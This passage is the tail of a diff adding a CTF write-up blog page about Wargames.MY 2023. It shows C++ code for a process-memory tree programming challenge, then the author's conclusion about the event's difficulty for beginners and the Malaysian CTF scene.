+</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> a;
+</span></span><span style="display:flex;"><span>            ppid <span style="color:#f92672">=</span> b;
+</span></span><span style="display:flex;"><span>            mem <span style="color:#f92672">=</span> c;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">memUsed</span>(){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (totalmem <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// this has alr been calculated
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">return</span> totalmem;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> total <span style="color:#f92672">=</span> mem;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (Process<span style="color:#f92672">*</span> child : children){
+</span></span><span style="display:flex;"><span>                total <span style="color:#f92672">+=</span> child<span style="color:#f92672">-&gt;</span>memUsed();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            totalmem <span style="color:#f92672">=</span> total;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> total;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> n,q;
+</span></span><span style="display:flex;"><span>    cin <span style="color:#f92672">&gt;&gt;</span> n <span style="color:#f92672">&gt;&gt;</span> q;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> a,b,c;
+</span></span><span style="display:flex;"><span>    unordered_map <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span>,Process<span style="color:#f92672">*&gt;</span> hashmap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        cin <span style="color:#f92672">&gt;&gt;</span> a <span style="color:#f92672">&gt;&gt;</span> b <span style="color:#f92672">&gt;&gt;</span> c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Process <span style="color:#f92672">*</span>current <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Process(a,b,c);
+</span></span><span style="display:flex;"><span>        hashmap.insert({a,current});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (b <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>            hashmap[b]<span style="color:#f92672">-&gt;</span>children.push_back(current);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pid;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> q; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        cin <span style="color:#f92672">&gt;&gt;</span> pid;
+</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> hashmap[pid]<span style="color:#f92672">-&gt;</span>memUsed() <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details></p>
+
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Overall, I think its not a bad ctf for ctf beginners (for pwn at least) since the challs aren&rsquo;t <strong>too</strong> easy and aren&rsquo;t rly that hard, so beginners will actually feel challenged when solving them, but will be able to solve them and learn a lot along the way if they do enough research and well, spend enough time on them. And even if they don&rsquo;t solve them, a lot is still learned in the end, which at the end of the day, is still a huge W.</p>
+<p>The organisers said that they tried to up the difficulty of the challenges this year compared to last year so that Malaysia students can improve and can compete in the international level and tbh I think that&rsquo;s great! Respect to the organisers for trying to build up the Malaysian ctf scene and I wish nothing but the best for them. Hope that I can do the same and help build the Malaysian ctf community in some way in the future as well.</p>
+<p>Hope that there are more pwn challs next year tho since there were like 8 web challs and only 3 pwn challs. I couldn&rsquo;t rly do anything else after blooding the pwn challs and solving the ppc chall since I&rsquo;m too noob at crypto and rev, and I <del>hate</del> dislike doing web <strong>(ig this is a personal skill issue)</strong>. But all in all, gg!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://zeynarz.github.io/posts/codegate_finals23/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Codegate Finals 2023 (Juniors)</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on twitter"
+        href="https://twitter.com/intent/tweet/?text=Wargames.MY%202023&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f&amp;hashtags=">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f&amp;title=Wargames.MY%202023&amp;summary=Wargames.MY%202023&amp;source=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f&title=Wargames.MY%202023">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on whatsapp"
+        href="https://api.whatsapp.com/send?text=Wargames.MY%202023%20-%20https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on telegram"
+        href="https://telegram.me/share/url?text=Wargames.MY%202023&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Wargames.MY 2023 on ycombinator"
+        href="https://news.ycombinator.com/submitlink?t=Wargames.MY%202023&u=https%3a%2f%2fzeynarz.github.io%2fposts%2fwgmy23%2f">
+        <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+            xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+            <path
+                d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://zeynarz.github.io/">zeynarz</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
